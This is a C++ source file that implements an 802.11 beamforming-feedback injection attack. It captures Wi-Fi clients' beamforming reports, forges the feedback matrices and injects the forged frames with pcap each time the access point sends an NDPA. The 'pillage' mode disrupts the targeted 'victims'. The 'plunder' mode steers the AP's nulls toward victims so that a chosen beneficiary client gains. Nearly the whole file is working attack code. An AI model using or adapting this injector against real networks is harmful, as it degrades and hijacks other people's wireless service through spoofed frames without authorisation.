#include "injector.h"
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <algorithm>
#include <cstring>
#include <cstdio>
#include <cmath>
#include <sstream>
#include <map>
#include <chrono>
#include <sys/time.h>

// ---------------------------------------------------------------------------
// Radiotap header for injected frames
// Minimal header: version, pad, len, present fields, rate, pad, TX flags
// Rate 0x6c = 54 Mbps (high MCS for short air time)
// TX flags 0x0018 = no ACK expected, sequence number injected
// ---------------------------------------------------------------------------
static const uint8_t RADIOTAP_HDR[] = {
    0x00, 0x00,       // version, pad
    0x0c, 0x00,       // header length = 12 bytes
    0x04, 0x80,       // present: RATE(bit2) + TX_FLAGS(bit15)
    0x00, 0x00,
    0x6c,             // rate: 54 Mbps
    0x00,             // pad for alignment
    0x18, 0x00        // TX flags: NOACK | SEQ
};
static const int RADIOTAP_HDR_LEN = sizeof(RADIOTAP_HDR);

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

static double now_ms() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec * 1000.0 + tv.tv_usec / 1000.0;
}

static std::string mac_to_str(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf),
             "%02x:%02x:%02x:%02x:%02x:%02x",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return std::string(buf);
}

// ---------------------------------------------------------------------------
// Injector
// ---------------------------------------------------------------------------

Injector::Injector(const std::string& iface,
                   const APInfo& ap,
                   Logger& logger)
    : iface_(iface), ap_(ap), logger_(logger) {}

Injector::~Injector() {
    close_handles();
}

void Injector::stop() {
    running_ = false;
}

bool Injector::open_handles(char* errbuf) {
    // Use pcap_open_live throughout to avoid kernel oops in rtw88 PCIe driver.
    // pcap_create/activate with PCAP_TSTAMP_HOST_HIPREC triggers a fault.
    sniff_handle_ = pcap_open_live(iface_.c_str(), 65535, 1, 50, errbuf);
    if (!sniff_handle_) return false;

    send_handle_ = pcap_open_live(iface_.c_str(), 65535, 1, 0, errbuf);
    if (!send_handle_) {
        pcap_close(sniff_handle_);
        sniff_handle_ = nullptr;
        return false;
    }

    return true;
}

void Injector::close_handles() {
    if (sniff_handle_) { pcap_close(sniff_handle_); sniff_handle_ = nullptr; }
    if (send_handle_)  { pcap_close(send_handle_);  send_handle_  = nullptr; }
}

int Injector::feedback_offset(BFIStandard std) {
    // Within the 802.11 frame body (after MAC header):
    // VHT: Category(1) + Action(1) + Dialog Token(1) + VHT MIMO Ctrl(3)
    //      + Avg SNR field(Nc bytes, variable) -- we skip SNR forgery
    //      Feedback matrix starts at body offset 6 + Nc
    //      However we use a fixed offset of 7 which matches the upstream code
    //      and the standard for 2-stream (Nc=2) VHT feedback.
    // HE:  Category(1) + Action(1) + Dialog Token(1) + HE MIMO Ctrl(5)
    //      Feedback matrix starts at body offset 8
    if (std == BFIStandard::VHT) return 7;
    return 8; // HE
}

std::string Injector::build_bpf(const std::vector<ClientInfo>& targets,
                                const ClientInfo* quartermaster) {
    std::ostringstream ss;
    // Portable raw-byte BPF filter: wlan[0] == 0x54 (NDPA), 0xd0 (Action), 0xe0 (No Ack)
    ss << "(wlan[0] == 0x54 and wlan addr2 " << ap_.bssid << ") or "
       << "((wlan[0] == 0xd0 or wlan[0] == 0xe0) and (";

    bool first = true;
    for (const auto& c : targets) {
        if (!first) ss << " or ";
        ss << "wlan addr2 " << c.mac;
        first = false;
    }
    if (quartermaster) {
        if (!first) ss << " or ";
        ss << "wlan addr2 " << quartermaster->mac;
    }
    ss << "))";
    return ss.str();
}

bool Injector::inject_forged(const uint8_t* genuine_pkt,
                              int genuine_len,
                              const uint8_t* forged_feedback,
                              int feedback_len,
                              int feedback_offset_in_frame,
                              uint8_t dialog_token) {
    uint16_t rt_len = genuine_pkt[2] | (genuine_pkt[3] << 8);
    int mac_offset  = rt_len;
    int fcs_len     = 4;

    int full_total = RADIOTAP_HDR_LEN + (genuine_len - mac_offset - fcs_len);
    int iface_mtu = 1500;
    
    // MTU fetch block remains the same...
    {
        struct ifreq ifr;
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock >= 0) {
            strncpy(ifr.ifr_name, iface_.c_str(), IFNAMSIZ);
            if (ioctl(sock, SIOCGIFMTU, &ifr) == 0)
                iface_mtu = ifr.ifr_mtu;
            close(sock);
        }
    }
    int forged_total = std::min(full_total, iface_mtu + RADIOTAP_HDR_LEN);

    std::vector<uint8_t> buf(forged_total, 0);
    memcpy(buf.data(), RADIOTAP_HDR, RADIOTAP_HDR_LEN);
    int copy_len = std::min(genuine_len - mac_offset - fcs_len, forged_total - RADIOTAP_HDR_LEN);
    memcpy(buf.data() + RADIOTAP_HDR_LEN, genuine_pkt + mac_offset, copy_len);

    // FIX 1: Set the Retry Bit in the MAC Header (Byte 1, Bit 3 = 0x08)
    buf[RADIOTAP_HDR_LEN + 1] |= 0x08;

    // FIX 2: Set the correct Dialog Token in the Action Frame body
    // Category(1) + Action(1) + Dialog Token(1) -> Offset 2 within body
    buf[RADIOTAP_HDR_LEN + 24 + 2] = dialog_token;

    // Overwrite feedback matrix bytes with forged content
    int fb_start = RADIOTAP_HDR_LEN + 24 + feedback_offset_in_frame;
    int actual_fb = std::min(feedback_len, forged_total - fb_start);
    if (actual_fb > 0 && fb_start < forged_total) {
        memcpy(buf.data() + fb_start, forged_feedback, actual_fb);
    }

    int res = pcap_inject(send_handle_, buf.data(), forged_total);
    return res == forged_total;
}
// ---------------------------------------------------------------------------
// Pillage attack loop
// ---------------------------------------------------------------------------

void Injector::run_pillage(const std::vector<ClientInfo>& victims,
                           const BFIParams& params,
                           StatsCallback cb) {
    char errbuf[PCAP_ERRBUF_SIZE];
    if (!open_handles(errbuf)) return;

    std::map<std::string, bool> victim_map;
    for (auto& v : victims) victim_map[v.mac] = true;

    pcap_pkthdr* hdr;
    const uint8_t* pkt;
    running_ = true;
    int seq = 0;
    
    std::vector<uint8_t> forged_buf(params.feedback_len, 0);

    while (running_) {
        int r = pcap_next_ex(sniff_handle_, &hdr, &pkt);
        if (r != 1) continue;

        uint16_t rt_len = pkt[2] | (pkt[3] << 8);
        if ((int)hdr->caplen < rt_len + 16) continue;

        const uint8_t* mac_hdr = pkt + rt_len;
        uint8_t fc0 = mac_hdr[0];
        uint8_t subtype = (fc0 & 0xFC);

        // ==========================================
        // TRIGGER 1: AP sends NDPA (0x54) -> INJECT IMMEDIATELY
        // ==========================================
        if (subtype == 0x54) {
            if ((int)hdr->caplen >= rt_len + 17) {
                uint8_t current_dialog_token = pkt[rt_len + 16];
                
                // Fire cached broadsides for all ready victims
                std::vector<InjectSample> samples;
                for (auto& [mac, cache] : forgery_cache_) {
                    if (cache.ready) {
                        double t0 = now_ms();
                        bool ok = inject_forged(cache.pkt_template.data(), cache.pkt_template.size(),
                                                cache.forged_feedback.data(), cache.feedback_len,
                                                cache.fb_off, current_dialog_token);
                        
                        double compute_ms = now_ms() - t0;
                        stats_.total_broadsides++;
                        if (ok) stats_.success_count++; else stats_.fail_count++;
                        
                        logger_.log_inject(mac, compute_ms, ok, seq++);
                        samples.push_back({mac, compute_ms, ok});
                    }
                }
                if (!samples.empty() && cb) cb(samples);
            }
            continue; 
        }

        // ==========================================
        // TRIGGER 2: Client sends BFI (0xD0/0xE0) -> CACHE NEW FORGERY
        // ==========================================
        if (subtype != 0xD0 && subtype != 0xE0) continue;
        if (mac_hdr[1] & 0x08) continue; // Ignore our own injected frames (Retry bit)

        if ((int)hdr->caplen < rt_len + 24) continue;
        std::string ta_str = mac_to_str(mac_hdr + 10);
        if (!victim_map.count(ta_str)) continue;

        const uint8_t* body = mac_hdr + 24;
        int body_len = (int)hdr->caplen - rt_len - 24 - 4;

        BFIParams detected;
        if (!bfi_detect(body, body_len, detected)) continue;
        if (detected.Nr != params.Nr || detected.Nc != params.Nc) continue;

        // Forge the matrix and update the cache for next time
        int fb_off = feedback_offset(detected.standard);
        const uint8_t* fb_bytes = body + fb_off;
        
        FeedbackMatrix genuine = bfi_decompress(fb_bytes, params);
        FeedbackMatrix forged  = bfi_forge_disrupt(genuine, params);
        bfi_compress(forged, params, forged_buf.data());

        CachedForgery& cache = forgery_cache_[ta_str];
        cache.pkt_template.assign(pkt, pkt + hdr->caplen);
        cache.forged_feedback = forged_buf;
        cache.feedback_len = params.feedback_len;
        cache.fb_off = fb_off;
        cache.ready = true;
    }
    close_handles();
}

// ---------------------------------------------------------------------------
// Plunder attack loop
// ---------------------------------------------------------------------------
void Injector::run_plunder(const std::vector<ClientInfo>& victims,
                           const ClientInfo& quartermaster,
                           const BFIParams& params,
                           StatsCallback cb) {
    char errbuf[PCAP_ERRBUF_SIZE];
    if (!open_handles(errbuf)) return;

    std::map<std::string, bool> victim_map;
    for (auto& v : victims) victim_map[v.mac] = true;

    // Track the Quartermaster's channel state
    FeedbackMatrix qm_matrix;
    bool qm_ready = false;

    pcap_pkthdr* hdr;
    const uint8_t* pkt;
    running_ = true;
    int seq = 0;
    
    std::vector<uint8_t> forged_buf(params.feedback_len, 0);

    while (running_) {
        int r = pcap_next_ex(sniff_handle_, &hdr, &pkt);
        if (r != 1) continue;

        uint16_t rt_len = pkt[2] | (pkt[3] << 8);
        if ((int)hdr->caplen < rt_len + 16) continue;

        const uint8_t* mac_hdr = pkt + rt_len;
        uint8_t fc0 = mac_hdr[0];
        uint8_t subtype = (fc0 & 0xFC);

        // ==========================================
        // TRIGGER 1: AP sends NDPA (0x54) -> INJECT IMMEDIATELY
        // ==========================================
        if (subtype == 0x54) {
            if ((int)hdr->caplen >= rt_len + 17) {
                uint8_t current_dialog_token = pkt[rt_len + 16];
                
                std::vector<InjectSample> samples;
                for (auto& [mac, cache] : forgery_cache_) {
                    if (cache.ready) {
                        double t0 = now_ms();
                        bool ok = inject_forged(cache.pkt_template.data(), cache.pkt_template.size(),
                                                cache.forged_feedback.data(), cache.feedback_len,
                                                cache.fb_off, current_dialog_token);
                        
                        double compute_ms = now_ms() - t0;
                        stats_.total_broadsides++;
                        if (ok) stats_.success_count++; else stats_.fail_count++;
                        
                        logger_.log_inject(mac, compute_ms, ok, seq++);
                        samples.push_back({mac, compute_ms, ok});
                    }
                }
                if (!samples.empty() && cb) cb(samples);
            }
            continue; 
        }

        // ==========================================
        // TRIGGER 2: Client sends BFI (0xD0/0xE0) -> UPDATE QM OR CACHE FORGERY
        // ==========================================
        if (subtype != 0xD0 && subtype != 0xE0) continue;
        if (mac_hdr[1] & 0x08) continue; // Ignore our own injected frames (Retry bit)

        if ((int)hdr->caplen < rt_len + 24) continue;
        std::string ta_str = mac_to_str(mac_hdr + 10);

        const uint8_t* body = mac_hdr + 24;
        int body_len = (int)hdr->caplen - rt_len - 24 - 4;

        BFIParams detected;
        if (!bfi_detect(body, body_len, detected)) continue;
        if (detected.Nr != params.Nr || detected.Nc != params.Nc) continue;

        int fb_off = feedback_offset(detected.standard);
        const uint8_t* fb_bytes = body + fb_off;

        // SCENARIO A: The Quartermaster (Beneficiary) is sending a BFI
        if (ta_str == quartermaster.mac) {
            qm_matrix = bfi_decompress(fb_bytes, params);
            qm_ready  = true; // We now have the beneficiary's spatial direction
            continue;
        }

        // SCENARIO B: A Victim is sending a BFI
        if (!victim_map.count(ta_str)) continue;
        if (!qm_ready) continue; // Cannot forge a plunder matrix if we don't know the QM's matrix yet

        // Forge the PLUNDER matrix (forces AP to beam nulls at the victim, saving energy for the QM)
        FeedbackMatrix genuine = bfi_decompress(fb_bytes, params);
        FeedbackMatrix forged  = bfi_forge_plunder(genuine, qm_matrix, params);
        bfi_compress(forged, params, forged_buf.data());

        CachedForgery& cache = forgery_cache_[ta_str];
        cache.pkt_template.assign(pkt, pkt + hdr->caplen);
        cache.forged_feedback = forged_buf;
        cache.feedback_len = params.feedback_len;
        cache.fb_off = fb_off;
        cache.ready = true;
    }
    close_handles();
}
